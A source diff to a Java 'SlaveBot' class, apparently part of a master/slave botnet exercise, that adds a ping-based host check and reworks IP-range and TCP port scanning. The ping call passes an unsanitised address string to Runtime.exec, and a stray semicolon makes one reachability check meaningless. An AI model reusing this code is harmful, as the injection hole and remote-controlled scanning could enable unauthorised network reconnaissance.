@@ -1,4 +1,5 @@
 import java.net.*;
+import java.text.BreakIterator;
 import java.util.*;
 import java.io.*;
 
@@ -17,7 +18,6 @@ public class SlaveBot extends Thread
 	{
 		int port = 0;
 		String ip = null;
-		
 		//for connection done for the first time
 		if(args.length != 0)
 		{
@@ -27,7 +27,6 @@ public class SlaveBot extends Thread
 				ip = args[1];
 				port = Integer.parseInt(args[3]);
 			}
-			
 			//input format example = "java SlaveBot -h localhost 9999"
 			else if(args.length == 3)
 			{
@@ -125,7 +124,6 @@ public class SlaveBot extends Thread
 				br.close();
 			}
 			
-			
 			for (String key : slavetoRemote.keySet()) 
 			{
 				if (key.equalsIgnoreCase(selectedSlave.getRemoteSocketAddress().toString())) 
@@ -176,7 +174,7 @@ public class SlaveBot extends Thread
 		Thread t1 = new Thread(r1);
 		t1.start();
 	}
-//--ipscan-------------------------------------------------------------------------------------------------------------------------------------
+//--tcpPortscan---------------------------------------------------------------------------------------------------------------------------------
 	public void tcpPortScan(Socket selectedSocket, String portRangeString, String targetIPAddress) throws IOException
 	{
 		socketSelected = selectedSocket;
@@ -199,10 +197,40 @@ public class SlaveBot extends Thread
 		String randomString = stringBuilder.toString();
 		return randomString;
 	}
-//--Runnable1 class method for ipscan thread--------------------------------------------------------------------------------------------------------------------
+//--scan---------------------------------------------------------------------------------------------------------------------------------------	
+	public boolean scan(String input) 
+    {
+        String ip = input;
+        String pingResult = "";
+
+        String pingCmd = "ping " + ip;
+        try 
+        {
+            Runtime r = Runtime.getRuntime();
+            Process p = r.exec(pingCmd);
+
+            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            String inputLine;
+            while ((inputLine = in.readLine()) != null) 
+            {
+                pingResult += inputLine;
+            }
+            in.close();
+            if (pingResult.contains("(0% loss)"))
+            {
+            	return true;
+            }
+        } catch (IOException e) 
+        {
+            System.out.println(e);
+        }
+		return false;
+
+    }
+//--Runnable1 class method for ipscan thread---------------------------------------------------------------------------------------------------
 	class Runnable1 implements Runnable
 	{
-//------run() method for threads--------------------------------------------------------------------------------------------------------------------
+//------run() method for threads---------------------------------------------------------------------------------------------------------------
 		public void run()
 		{
 			try
@@ -212,46 +240,55 @@ public class SlaveBot extends Thread
 				String[] tupleStart = range[0].split("\\.");
 				String[] tupleEnd = range[1].split("\\.");
 		
-				long result1 = 0;
-				long result2 = 0;
-				
-				for (int i = 0; i < tupleStart.length; i++) 
+				if(tupleStart[0].equals("127") && tupleStart[1].equals("0") && tupleStart[2].equals("0"))
 				{
-					int power = 3 - i;
-					int ip = Integer.parseInt(tupleStart[i]);
-					result1 += ip * Math.pow(256, power);
+					if(scan("127.0.0.1"));
+						listOfResponsdedTarget.add("127.0.0.1");
+					m.printIpScan(listOfResponsdedTarget);
 				}
-				
-				for (int i = 0; i < tupleEnd.length; i++) 
+				else
 				{
-					int power = 3 - i;
-					int ip = Integer.parseInt(tupleEnd[i]);
-					result2 += ip * Math.pow(256, power);
-				}
-				
-				for (long i = result1; i < (result2 + 1); ++i)
-				{
-					long new_result1 = i;
-					String ipString;
-					StringBuilder sb = new StringBuilder(15);
-					for (int j = 0; j < 4; j++) 
+					long result1 = 0;
+					long result2 = 0;
+					
+					for (int i = 0; i < tupleStart.length; i++) 
 					{
-						sb.insert(0,Long.toString(new_result1 & 0xff));
-						if (j < 3) 
+						int power = 3 - i;
+						int ip = Integer.parseInt(tupleStart[i]);
+						result1 += ip * Math.pow(256, power);
+					}
+					
+					for (int i = 0; i < tupleEnd.length; i++) 
+					{
+						int power = 3 - i;
+						int ip = Integer.parseInt(tupleEnd[i]);
+						result2 += ip * Math.pow(256, power);
+					}
+					
+					for (long i = result1; i < (result2 + 1); ++i)
+					{
+						long new_result1 = i;
+						String ipString;
+						StringBuilder sb = new StringBuilder(15);
+						for (int j = 0; j < 4; j++) 
 						{
-							sb.insert(0,'.');
+							sb.insert(0,Long.toString(new_result1 & 0xff));
+							if (j < 3) 
+							{
+								sb.insert(0,'.');
+							}
+							new_result1 = new_result1 >> 8;
 						}
-						new_result1 = new_result1 >> 8;
-					}
-					ipString = sb.toString();
-					InetAddress ip = InetAddress.getByName(ipString);
-
-					if(ip.isReachable(200))
-					{
-						listOfResponsdedTarget.add(ipString);
-					}
-				}		
-				m.printIpScan(listOfResponsdedTarget);
+						ipString = sb.toString();
+						InetAddress ip = InetAddress.getByName(ipString);
+	
+						if(ip.isReachable(200))
+						{
+							listOfResponsdedTarget.add(ipString);
+						}
+					}		
+					m.printIpScan(listOfResponsdedTarget);
+				}
 			} catch(IOException e)
 			{
 				System.out.println("ipScan Failure.");
@@ -259,10 +296,10 @@ public class SlaveBot extends Thread
 			}
 		}
 	}
-//--Runnable1 class method for ipscan thread--------------------------------------------------------------------------------------------------------------------
+//--Runnable1 class method for ipscan thread-----------------------------------------------------------------------------------------------------
 	class Runnable2 implements Runnable
 	{
-//------run() method for threads--------------------------------------------------------------------------------------------------------------------
+//------run() method for threads-----------------------------------------------------------------------------------------------------------------
 		public void run()
 		{
 			ArrayList<String> activePorts = new ArrayList<String>();
@@ -277,7 +314,7 @@ public class SlaveBot extends Thread
 					portScanSocket.close();
 				}catch(IOException e)
 				{
-				--------//empty catch block
+				//--empty catch block
 				}
 			}
 			m.printtcpPortScan(activePorts);
